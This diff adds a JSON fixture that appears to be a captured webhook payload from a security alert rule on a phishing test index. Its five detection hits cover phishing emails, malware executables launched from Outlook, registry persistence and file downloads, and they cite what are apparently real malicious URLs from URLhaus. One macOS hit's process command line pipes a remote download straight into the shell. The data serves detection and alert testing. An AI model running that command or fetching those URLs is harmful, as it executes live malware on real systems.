@@ -1,0 +1,626 @@
+[
+  {
+    "headers": {
+      "accept": "application/json, text/plain, */*",
+      "content-type": "application/json",
+      "user-agent": "axios/1.16.1",
+      "content-length": "9271",
+      "accept-encoding": "gzip, compress, deflate, br",
+      "traceparent": "00-4f7b21c6e0a94d3fb8125ac7e91d4402-8c1de55a2b9f7d61-01",
+      "host": "172.17.0.1:5678",
+      "connection": "keep-alive"
+    },
+    "params": {},
+    "query": {},
+    "body": {
+      "rule_name": "Phishing-Malware-Delivery-RealIOC",
+      "context": {
+        "title": "rule 'Phishing-Malware-Delivery-RealIOC' matched query",
+        "date": "2026-07-27T02:15:44.118Z",
+        "value": 5,
+        "hits": [
+          {
+            "_index": "phishing-test-000002",
+            "_id": "Yr1Ma58BDnyHcQd3vSxW",
+            "_score": null,
+            "_source": {
+              "@timestamp": "2026-07-25T11:26:13.000Z",
+              "event": {
+                "category": "email",
+                "action": "message-delivered",
+                "kind": "alert",
+                "severity": 73,
+                "outcome": "success"
+              },
+              "email": {
+                "from": {
+                  "address": "billing@invoice-kmitl-secure.com"
+                },
+                "to": {
+                  "address": "somchai.p@kmitl.ac.th"
+                },
+                "subject": "RE: Outstanding Invoice INV-88421 - Immediate Payment Required",
+                "message_id": "<20260725112613.4A21B@invoice-kmitl-secure.com>",
+                "attachments": [
+                  {
+                    "file": {
+                      "name": "INV-88421.exe",
+                      "size": 68,
+                      "extension": "exe",
+                      "mime_type": "application/x-msdownload",
+                      "hash": {
+                        "md5": "44d88612fea8a8f36de82e1278abb02f",
+                        "sha1": "3395856ce81f2b7382dee72602f798b642f14140",
+                        "sha256": "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"
+                      }
+                    }
+                  }
+                ]
+              },
+              "url": {
+                "original": "https://customcreationsmaine.com/fed/remcosraw.exe",
+                "domain": "customcreationsmaine.com"
+              },
+              "source": {
+                "ip": "50.16.16.211",
+                "port": 443
+              },
+              "destination": {
+                "ip": "203.150.19.44",
+                "port": 25
+              },
+              "host": {
+                "name": "mail-gw-01"
+              },
+              "user": {
+                "name": "somchai.p",
+                "domain": "KMITL"
+              },
+              "threat": {
+                "indicator": {
+                  "type": "url",
+                  "provider": "URLhaus",
+                  "reference": "https://urlhaus.abuse.ch/url/3891436/"
+                },
+                "technique": {
+                  "id": "T1566.001",
+                  "name": "Spearphishing Attachment"
+                }
+              }
+            },
+            "fields": {
+              "@timestamp": [
+                "2026-07-25T11:26:13.000Z"
+              ]
+            },
+            "sort": [
+              "2026-07-25T11:26:13.000Z"
+            ]
+          },
+          {
+            "_index": "phishing-test-000002",
+            "_id": "6r1Aa58BDnyHcQd3HCtL",
+            "_score": null,
+            "_source": {
+              "@timestamp": "2026-07-25T11:22:13.000Z",
+              "event": {
+                "category": "email",
+                "action": "message-delivered",
+                "kind": "alert",
+                "severity": 68,
+                "outcome": "success"
+              },
+              "email": {
+                "from": {
+                  "address": "hr-notice@kmitl-payroll.net"
+                },
+                "to": {
+                  "address": "nattaya.s@kmitl.ac.th"
+                },
+                "cc": {
+                  "address": "finance-team@kmitl.ac.th"
+                },
+                "subject": "Salary Adjustment Notice - Please Review Attached Document",
+                "message_id": "<CA+9x8fQ2mZ@kmitl-payroll.net>"
+              },
+              "url": {
+                "full": "https://drive.google.com/uc?export=download&id=1EznN9ZSMbkarOKxIJQJNw-P_JNXqHJQz",
+                "domain": "drive.google.com"
+              },
+              "source": {
+                "ip": "162.243.103.246"
+              },
+              "host": {
+                "name": "mail-gw-02"
+              },
+              "user": {
+                "name": "nattaya.s"
+              },
+              "user_agent": {
+                "original": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 GuLoader/4.1"
+              },
+              "threat": {
+                "indicator": {
+                  "type": "url",
+                  "provider": "URLhaus",
+                  "reference": "https://urlhaus.abuse.ch/url/3891433/"
+                },
+                "technique": {
+                  "id": "T1566.002",
+                  "name": "Spearphishing Link"
+                }
+              }
+            },
+            "fields": {
+              "@timestamp": [
+                "2026-07-25T11:22:13.000Z"
+              ]
+            },
+            "sort": [
+              "2026-07-25T11:22:13.000Z"
+            ]
+          },
+          {
+            "_index": "phishing-test-000002",
+            "_id": "b70za58BDnyHcQd3sSvJ",
+            "_score": null,
+            "_source": {
+              "@timestamp": "2026-07-25T12:04:51.000Z",
+              "event": {
+                "category": "process",
+                "action": "process-started",
+                "kind": "alert",
+                "severity": 90,
+                "outcome": "success"
+              },
+              "process": {
+                "name": "bin.exe",
+                "executable": "C:\\Users\\somchai.p\\AppData\\Local\\Temp\\bin.exe",
+                "command_line": "\"C:\\Users\\somchai.p\\AppData\\Local\\Temp\\bin.exe\" -silent -url https://customcreationsmaine.com/db22/bin.exe",
+                "pid": 6612,
+                "parent": {
+                  "name": "outlook.exe",
+                  "executable": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"
+                }
+              },
+              "file": {
+                "name": "bin.exe",
+                "path": "C:\\Users\\somchai.p\\AppData\\Local\\Temp\\bin.exe",
+                "hash": {
+                  "md5": "e3aaa940c8c30f0571cc42a6e9260f60"
+                }
+              },
+              "url": {
+                "original": "https://customcreationsmaine.com/db22/bin.exe",
+                "domain": "customcreationsmaine.com"
+              },
+              "registry": {
+                "path": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Windows Update"
+              },
+              "dns": {
+                "question": {
+                  "name": "heroestales.com",
+                  "type": "A"
+                }
+              },
+              "source": {
+                "ip": "10.14.22.87"
+              },
+              "destination": {
+                "ip": "34.204.119.63",
+                "port": 443
+              },
+              "host": {
+                "name": "WKS-ENG-114",
+                "os": {
+                  "family": "windows"
+                }
+              },
+              "user": {
+                "name": "somchai.p",
+                "domain": "KMITL"
+              },
+              "threat": {
+                "indicator": {
+                  "type": "file",
+                  "provider": "URLhaus",
+                  "reference": "https://urlhaus.abuse.ch/url/3891435/"
+                },
+                "technique": {
+                  "id": "T1204.002",
+                  "name": "Malicious File"
+                }
+              }
+            },
+            "fields": {
+              "@timestamp": [
+                "2026-07-25T12:04:51.000Z"
+              ]
+            },
+            "sort": [
+              "2026-07-25T12:04:51.000Z"
+            ]
+          },
+          {
+            "_index": "phishing-test-000002",
+            "_id": "Kp2Qb58BDnyHcQd3xYtR",
+            "_score": null,
+            "_source": {
+              "@timestamp": "2026-07-26T16:32:09.000Z",
+              "event": {
+                "category": "network",
+                "action": "file-download",
+                "kind": "alert",
+                "severity": 77,
+                "outcome": "success"
+              },
+              "url": {
+                "full": "https://broadwalkindia.com/1.exe",
+                "domain": "broadwalkindia.com"
+              },
+              "file": {
+                "name": "1.exe",
+                "hash": {
+                  "md5": "f0e7dc585ba3ebf586da7b92aedbfc64"
+                }
+              },
+              "source": {
+                "ip": "10.14.22.87"
+              },
+              "destination": {
+                "ip": "178.62.3.223",
+                "port": 8080
+              },
+              "host": {
+                "name": "WKS-ENG-114"
+              },
+              "user": {
+                "name": "somchai.p"
+              },
+              "threat": {
+                "indicator": {
+                  "type": "url",
+                  "provider": "URLhaus",
+                  "reference": "https://urlhaus.abuse.ch/url/3892187/"
+                }
+              }
+            },
+            "fields": {
+              "@timestamp": [
+                "2026-07-26T16:32:09.000Z"
+              ]
+            },
+            "sort": [
+              "2026-07-26T16:32:09.000Z"
+            ]
+          },
+          {
+            "_index": "phishing-test-000002",
+            "_id": "Mq7Rc58BDnyHcQd3zLuV",
+            "_score": null,
+            "_source": {
+              "@timestamp": "2026-07-26T16:49:07.000Z",
+              "event": {
+                "category": "network",
+                "action": "file-download",
+                "kind": "alert",
+                "severity": 85,
+                "outcome": "success"
+              },
+              "url": {
+                "full": "http://tampareroofing.com/curl/f293a6dc24a4cfe46895e7bc4f91ffcf276ac71a74b13fed54458ad51af9dbb3",
+                "domain": "tampareroofing.com"
+              },
+              "file": {
+                "name": "update.sh",
+                "path": "/Users/pimchanok/Downloads/update.sh",
+                "hash": {
+                  "sha256": "f293a6dc24a4cfe46895e7bc4f91ffcf276ac71a74b13fed54458ad51af9dbb3"
+                }
+              },
+              "process": {
+                "command_line": "/bin/sh -c curl -fsSL http://blakcinwhitexn.cc/1557fad8649e638f43f20cccf5794a440c70eae03204f5af9fe9850b3197b8ff | sh"
+              },
+              "dns": {
+                "question": {
+                  "name": "blakcinwhitexn.cc",
+                  "type": "A"
+                }
+              },
+              "source": {
+                "ip": "10.14.30.19"
+              },
+              "host": {
+                "name": "MBP-PIMCHANOK",
+                "os": {
+                  "family": "macos"
+                }
+              },
+              "user": {
+                "name": "pimchanok"
+              },
+              "vulnerability": {
+                "id": "CVE-2026-24085"
+              },
+              "threat": {
+                "indicator": {
+                  "type": "file",
+                  "provider": "URLhaus",
+                  "reference": "https://urlhaus.abuse.ch/url/3892194/"
+                },
+                "technique": {
+                  "id": "T1204.004",
+                  "name": "Malicious Copy and Paste"
+                }
+              }
+            },
+            "fields": {
+              "@timestamp": [
+                "2026-07-26T16:49:07.000Z"
+              ]
+            },
+            "sort": [
+              "2026-07-26T16:49:07.000Z"
+            ]
+          }
+        ],
+        "link": "/app/r?l=DISCOVER_APP_LOCATOR&v=9.4.3&lz=N4IgJghgLhBqCWBTA7gZQA6IMYgFynjDxADYBmAJkQBYAjLCAWlooFYBOR6gDloEZGERCRKDEEdrWzUsfCjgA0IKPCgAbRMXQALeAGddAOwDmjKIj1RGABlu2%2BAKhBKVAW0QAxJGrAA5CO7EAAJuFjCu6M4gegD2AK4ATlie8GrmCXp4AtoAukoAZt5gHjEJrtCZ%2BAC%2BSglxhqFeiD4AshCR1UoQamoxyL4xAJKGYIgAHnj53XqISoYBmrggAAq6BvAmjJAwZmFR3b3IABKEo4aT07Mg5fPGiES4U2ozNSCFaYgZ2XkgAI5xnwAnnhQP8gcQomoICY4hA7sQANYAhLA16hABK0Ph%2BDeCRirmIFGsFFE1lEFD4ABU%2BGRcKw%2BLgyCQAHQkdgUABaUSgMUJxNJAHZGBTqbT6YyWWzOSBXvoAIIaBJQdEWOJpSpQOqIKpAA%3D",
+        "sourceFields": {
+          "email.from.address": [
+            "billing@invoice-kmitl-secure.com",
+            "hr-notice@kmitl-payroll.net"
+          ],
+          "email.to.address": [
+            "somchai.p@kmitl.ac.th",
+            "nattaya.s@kmitl.ac.th"
+          ],
+          "email.cc.address": [
+            "finance-team@kmitl.ac.th"
+          ],
+          "email.message_id": [
+            "<20260725112613.4A21B@invoice-kmitl-secure.com>",
+            "<CA+9x8fQ2mZ@kmitl-payroll.net>"
+          ],
+          "email.subject": [
+            "RE: Outstanding Invoice INV-88421 - Immediate Payment Required",
+            "Salary Adjustment Notice - Please Review Attached Document"
+          ],
+          "email.attachments.file.hash.md5": [
+            "44d88612fea8a8f36de82e1278abb02f"
+          ],
+          "email.attachments.file.hash.sha1": [
+            "3395856ce81f2b7382dee72602f798b642f14140"
+          ],
+          "email.attachments.file.hash.sha256": [
+            "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"
+          ],
+          "event.category": [
+            "email",
+            "process",
+            "network"
+          ],
+          "event.action": [
+            "message-delivered",
+            "process-started",
+            "file-download"
+          ],
+          "file.hash.md5": [
+            "e3aaa940c8c30f0571cc42a6e9260f60",
+            "f0e7dc585ba3ebf586da7b92aedbfc64"
+          ],
+          "file.hash.sha256": [
+            "f293a6dc24a4cfe46895e7bc4f91ffcf276ac71a74b13fed54458ad51af9dbb3"
+          ],
+          "file.name": [
+            "bin.exe",
+            "1.exe",
+            "update.sh"
+          ],
+          "file.path": [
+            "C:\\Users\\somchai.p\\AppData\\Local\\Temp\\bin.exe",
+            "/Users/pimchanok/Downloads/update.sh"
+          ],
+          "host.name": [
+            "mail-gw-01",
+            "mail-gw-02",
+            "WKS-ENG-114",
+            "MBP-PIMCHANOK"
+          ],
+          "process.command_line": [
+            "\"C:\\Users\\somchai.p\\AppData\\Local\\Temp\\bin.exe\" -silent -url https://customcreationsmaine.com/db22/bin.exe",
+            "/bin/sh -c curl -fsSL http://blakcinwhitexn.cc/1557fad8649e638f43f20cccf5794a440c70eae03204f5af9fe9850b3197b8ff | sh"
+          ],
+          "registry.path": [
+            "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Windows Update"
+          ],
+          "dns.question.name": [
+            "heroestales.com",
+            "blakcinwhitexn.cc"
+          ],
+          "source.ip": [
+            "50.16.16.211",
+            "162.243.103.246",
+            "10.14.22.87",
+            "10.14.30.19"
+          ],
+          "destination.ip": [
+            "203.150.19.44",
+            "34.204.119.63",
+            "178.62.3.223"
+          ],
+          "url.domain": [
+            "customcreationsmaine.com",
+            "drive.google.com",
+            "broadwalkindia.com",
+            "tampareroofing.com"
+          ],
+          "url.full": [
+            "https://drive.google.com/uc?export=download&id=1EznN9ZSMbkarOKxIJQJNw-P_JNXqHJQz",
+            "https://broadwalkindia.com/1.exe",
+            "http://tampareroofing.com/curl/f293a6dc24a4cfe46895e7bc4f91ffcf276ac71a74b13fed54458ad51af9dbb3"
+          ],
+          "url.original": [
+            "https://customcreationsmaine.com/fed/remcosraw.exe",
+            "https://customcreationsmaine.com/db22/bin.exe"
+          ],
+          "user.name": [
+            "somchai.p",
+            "nattaya.s",
+            "pimchanok"
+          ],
+          "email": {
+            "from": {
+              "address": [
+                "billing@invoice-kmitl-secure.com",
+                "hr-notice@kmitl-payroll.net"
+              ]
+            },
+            "to": {
+              "address": [
+                "somchai.p@kmitl.ac.th",
+                "nattaya.s@kmitl.ac.th"
+              ]
+            },
+            "cc": {
+              "address": [
+                "finance-team@kmitl.ac.th"
+              ]
+            },
+            "message_id": [
+              "<20260725112613.4A21B@invoice-kmitl-secure.com>",
+              "<CA+9x8fQ2mZ@kmitl-payroll.net>"
+            ],
+            "subject": [
+              "RE: Outstanding Invoice INV-88421 - Immediate Payment Required",
+              "Salary Adjustment Notice - Please Review Attached Document"
+            ],
+            "attachments": {
+              "file": {
+                "hash": {
+                  "md5": [
+                    "44d88612fea8a8f36de82e1278abb02f"
+                  ],
+                  "sha1": [
+                    "3395856ce81f2b7382dee72602f798b642f14140"
+                  ],
+                  "sha256": [
+                    "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"
+                  ]
+                }
+              }
+            }
+          },
+          "event": {
+            "category": [
+              "email",
+              "process",
+              "network"
+            ],
+            "action": [
+              "message-delivered",
+              "process-started",
+              "file-download"
+            ]
+          },
+          "file": {
+            "hash": {
+              "md5": [
+                "e3aaa940c8c30f0571cc42a6e9260f60",
+                "f0e7dc585ba3ebf586da7b92aedbfc64"
+              ],
+              "sha256": [
+                "f293a6dc24a4cfe46895e7bc4f91ffcf276ac71a74b13fed54458ad51af9dbb3"
+              ]
+            },
+            "name": [
+              "bin.exe",
+              "1.exe",
+              "update.sh"
+            ],
+            "path": [
+              "C:\\Users\\somchai.p\\AppData\\Local\\Temp\\bin.exe",
+              "/Users/pimchanok/Downloads/update.sh"
+            ]
+          },
+          "host": {
+            "name": [
+              "mail-gw-01",
+              "mail-gw-02",
+              "WKS-ENG-114",
+              "MBP-PIMCHANOK"
+            ]
+          },
+          "process": {
+            "command_line": [
+              "\"C:\\Users\\somchai.p\\AppData\\Local\\Temp\\bin.exe\" -silent -url https://customcreationsmaine.com/db22/bin.exe",
+              "/bin/sh -c curl -fsSL http://blakcinwhitexn.cc/1557fad8649e638f43f20cccf5794a440c70eae03204f5af9fe9850b3197b8ff | sh"
+            ]
+          },
+          "registry": {
+            "path": [
+              "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Windows Update"
+            ]
+          },
+          "dns": {
+            "question": {
+              "name": [
+                "heroestales.com",
+                "blakcinwhitexn.cc"
+              ]
+            }
+          },
+          "source": {
+            "ip": [
+              "50.16.16.211",
+              "162.243.103.246",
+              "10.14.22.87",
+              "10.14.30.19"
+            ]
+          },
+          "destination": {
+            "ip": [
+              "203.150.19.44",
+              "34.204.119.63",
+              "178.62.3.223"
+            ]
+          },
+          "url": {
+            "domain": [
+              "customcreationsmaine.com",
+              "drive.google.com",
+              "broadwalkindia.com",
+              "tampareroofing.com"
+            ],
+            "full": [
+              "https://drive.google.com/uc?export=download&id=1EznN9ZSMbkarOKxIJQJNw-P_JNXqHJQz",
+              "https://broadwalkindia.com/1.exe",
+              "http://tampareroofing.com/curl/f293a6dc24a4cfe46895e7bc4f91ffcf276ac71a74b13fed54458ad51af9dbb3"
+            ],
+            "original": [
+              "https://customcreationsmaine.com/fed/remcosraw.exe",
+              "https://customcreationsmaine.com/db22/bin.exe"
+            ]
+          },
+          "user": {
+            "name": [
+              "somchai.p",
+              "nattaya.s",
+              "pimchanok"
+            ]
+          }
+        },
+        "conditions": "Number of matching documents is greater than 0",
+        "message": "Document count is 5 in the last 7d in Phishing-data-test data view. Alert when greater than 0."
+      },
+      "state": {
+        "latestTimestamp": "2026-07-26T16:49:07.000Z",
+        "dateStart": "2026-07-20T02:15:44.118Z",
+        "dateEnd": "2026-07-27T02:15:44.118Z",
+        "start": "2026-07-27T02:15:44.862Z",
+        "duration": "604800000000000"
+      }
+    },
+    "webhookUrl": "http://localhost:5678/webhook-test/54c43b3a-697f-4152-9259-606984d87d96",
+    "executionMode": "test"
+  }
+]
